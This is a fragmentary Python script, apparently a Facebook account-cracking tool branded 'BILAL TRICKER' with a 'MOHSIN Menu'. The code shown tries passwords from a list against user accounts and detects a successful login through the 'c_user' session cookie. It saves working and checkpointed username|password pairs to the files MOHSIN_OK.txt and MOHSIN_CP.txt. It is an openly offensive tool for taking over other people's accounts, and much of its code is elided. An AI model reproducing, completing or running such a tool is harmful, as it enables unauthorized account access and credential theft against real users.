...
==================================================
           ...
           FB PAGE  : BILAL TRICKER
==================================================           
\x1b[0;91m\x1b[1;43m                  B1L4L TH3 BR4ND :)                 \x1b[0m"""
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    input("\x1b[1;97mPress enter to back MOHSIN Menu ")
	    mohsin()
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [MOHSIN-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('MOHSIN_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [MOHSIN-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('MOHSIN_CP.txt' , 'a').write('%s\n' % wrt)
                        break
